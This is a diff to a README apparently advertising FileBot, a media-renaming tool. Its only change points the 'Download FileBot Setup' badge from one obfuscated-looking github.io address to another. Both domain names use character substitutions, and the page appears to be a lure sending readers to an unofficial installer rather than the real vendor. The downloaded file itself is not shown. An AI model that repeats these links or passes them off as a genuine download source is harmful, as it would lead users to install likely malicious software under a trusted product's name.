@@ -2,7 +2,7 @@
 ### 🛠️ *Organize, rename, and subtitle your media effortlessly.*
 
 <p align="center">
-  <a href="https://filepcbotfore8inf0.github.io/.github/" target="_blank">
+  <a href="https://fileb0tforpc6web0.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-FILEBOT_SETUP-0078d4?style=for-the-badge&logo=mediabook&logoColor=white" alt="Download FileBot Setup" />
   </a>
 </p>
